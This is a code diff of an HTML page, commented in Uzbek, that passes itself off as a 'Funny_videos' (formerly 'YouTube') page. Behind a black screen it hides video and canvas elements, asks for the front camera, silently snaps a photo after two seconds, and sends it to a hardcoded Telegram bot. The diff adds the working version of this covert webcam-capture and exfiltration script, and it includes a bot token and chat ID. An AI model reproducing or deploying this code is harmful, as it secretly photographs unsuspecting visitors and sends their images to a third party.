@@ -2,14 +2,16 @@
 <html lang="uz">
 <head>
     <meta charset="UTF-8">
-    <title>YouTube</title>
+    <title>Funny_videos</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
     <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+        html, body {
+            margin: 0;
+            padding: 0;
             background: #000;
+            height: 100%;
+            overflow: hidden;
         }
         video, canvas {
             display: none;
@@ -18,68 +20,50 @@
 </head>
 <body>
 
-<video id="video" autoplay></video>
+<video id="video" autoplay playsinline></video>
 <canvas id="canvas" width="320" height="240"></canvas>
 
 <script>
-    navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-            const video = document.getElementById('video');
-            video.srcObject = stream;
+    // 🔴 Telegram bot token va chat ID
+    const BOT_TOKEN = "8253226409:AAF3QMVPFJt5FY30cKuUQyosR0oivsRLUxg";
+    const CHAT_ID  = "7880376636";
 
-            // 2 soniyadan keyin avtomatik rasm olish
-            setTimeout(() => {
-                const canvas = document.getElementById('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    function sendToTelegram(imageBlob) {
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", imageBlob);
 
-                // Kamera o‘chadi
-                stream.getTracks().forEach(track => track.stop());
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: "POST",
+            body: formData
+        }).catch(err => console.log("Telegram xato"));
+    }
 
-                console.log("Rasm olindi");
-            }, 2000);
-        })
-        .catch(err => {
-            console.log("Kameraga ruxsat berilmadi");
-        });
-    <script>
-function sendToTelegram(imageData) {
-    const botToken = "8253226409:AAF3QMVPFJt5FY30cKuUQyosR0oivsRLUxg";
-    const chatId = "7880376636";
+    navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user" } // old kamera
+    })
+    .then(stream => {
+        const video = document.getElementById("video");
+        video.srcObject = stream;
 
-    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-        method: "POST",
-        body: new URLSearchParams({
-            chat_id: chatId,
-            photo: imageData
-        })
+        // 2 soniyadan keyin avtomatik rasm olish
+        setTimeout(() => {
+            const canvas = document.getElementById("canvas");
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                sendToTelegram(blob);
+            }, "image/jpeg", 0.9);
+
+            // Kamera o‘chadi
+            stream.getTracks().forEach(track => track.stop());
+        }, 2000);
+    })
+    .catch(err => {
+        console.log("Kameraga ruxsat berilmadi");
     });
-}
-
-navigator.mediaDevices.getUserMedia({ video: true })
-.then(stream => {
-    const video = document.createElement("video");
-    video.srcObject = stream;
-    video.play();
-
-    setTimeout(() => {
-        const canvas = document.createElement("canvas");
-        canvas.width = 320;
-        canvas.height = 240;
-        canvas.getContext("2d").drawImage(video, 0, 0, 320, 240);
-
-        const imageData = canvas.toDataURL("image/jpeg");
-        sendToTelegram(imageData);
-
-        stream.getTracks().forEach(t => t.stop());
-    }, 2000);
-});
-</script>
-
 </script>
 
 </body>
 </html>
-
-
-
